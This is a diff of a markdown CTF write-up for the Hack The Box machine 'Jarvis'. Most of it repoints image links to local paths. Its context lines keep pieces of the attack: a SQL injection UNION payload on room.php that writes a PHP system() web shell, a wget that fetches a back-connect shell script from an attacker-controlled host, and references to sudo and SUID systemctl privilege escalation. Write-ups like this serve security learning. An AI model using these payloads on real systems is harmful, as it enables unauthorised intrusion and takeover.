@@ -23,7 +23,7 @@ Anyone who knows me personally would know that I dislike CTF style boxes where y
 
 
 
-![1568728913954](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568728913954.png)
+![1568728913954](/images/2019/Jarvis/1568728913954.png)
 
 
 
@@ -97,7 +97,7 @@ Crawling through the website, we notice that the `room.php` page takes an input 
 
 
 
-![1568723719909](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568723719909.png)
+![1568723719909](/images/2019/Jarvis/1568723719909.png)
 
 
 
@@ -105,7 +105,7 @@ We can further test if the previous example was a false positive using the `orde
 
 
 
-![1568723834604](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568723834604.png)
+![1568723834604](/images/2019/Jarvis/1568723834604.png)
 
 
 
@@ -113,7 +113,7 @@ We can increment the number we `order by` to test how many columns are returned 
 
 
 
-![1568723867745](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568723867745.png)
+![1568723867745](/images/2019/Jarvis/1568723867745.png)
 
 
 
@@ -131,7 +131,7 @@ http://10.10.10.143/room.php?cod=1+union+select+1,2,3,4,5,6,'<%3fphp+system($_GE
 
 
 
-![1568723959570](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568723959570.png)
+![1568723959570](/images/2019/Jarvis/1568723959570.png)
 
 
 
@@ -141,7 +141,7 @@ After that, we can try accessing our new file at `10.10.10.143/cmd.php` and note
 
 
 
-![1568728086337](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568728086337.png)
+![1568728086337](/images/2019/Jarvis/1568728086337.png)
 
 
 
@@ -166,7 +166,7 @@ Of course you don't have to use `curl`, just entering the payload in the browser
 
 In any case, we get a shell!
 
-![1568724141929](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568724141929.png)
+![1568724141929](/images/2019/Jarvis/1568724141929.png)
 
 
 
@@ -184,7 +184,7 @@ We upgrade to a prettier shell, and run a `sudo -l` to check out sudo privileges
 
 
 
-![1568724227472](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568724227472.png)
+![1568724227472](/images/2019/Jarvis/1568724227472.png)
 
 
 
@@ -192,7 +192,7 @@ An interesting command was found within this `simpler.py` file.
 
 
 
-![1568724294794](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568724294794.png)
+![1568724294794](/images/2019/Jarvis/1568724294794.png)
 
 
 
@@ -218,7 +218,7 @@ python -m SimpleHTTPServer 1234
 
 
 
-![1568724965720](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568724965720.png)
+![1568724965720](/images/2019/Jarvis/1568724965720.png)
 
 
 
@@ -234,7 +234,7 @@ wget 10.10.16.53:1234/tcp_pty_backconnect.py
 
 
 
-![1568725392837](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568725392837.png)
+![1568725392837](/images/2019/Jarvis/1568725392837.png)
 
 
 
@@ -254,7 +254,7 @@ We run the script as the user `pepper`, and see the usage instructions. Here we 
 
 
 
-![1568726080425](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568726080425.png)
+![1568726080425](/images/2019/Jarvis/1568726080425.png)
 
 
 
@@ -271,7 +271,7 @@ On the listener we previously set up, we see that we got our user shell.
 
 
 
-![1568726351083](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568726351083.png)
+![1568726351083](/images/2019/Jarvis/1568726351083.png)
 
 
 
@@ -287,7 +287,7 @@ Doing the usual checks, we see that `systemctl` has an SUID bit set and will run
 
 
 
-![1568726493292](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568726493292.png)
+![1568726493292](/images/2019/Jarvis/1568726493292.png)
 
 
 
@@ -331,7 +331,7 @@ And executing these gets us our root shell. From here we can go to the respectiv
 
 
 
-![1568727190405](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Jarvis/1568727190405.png)
+![1568727190405](/images/2019/Jarvis/1568727190405.png)
 
 
 
@@ -344,7 +344,6 @@ Cya guys next time. I love you 3000!
 [1]: https://github.com/infodox/python-pty-shells
 
 [2]: https://gtfobins.github.io/gtfobins/systemctl/
-
 
 
 
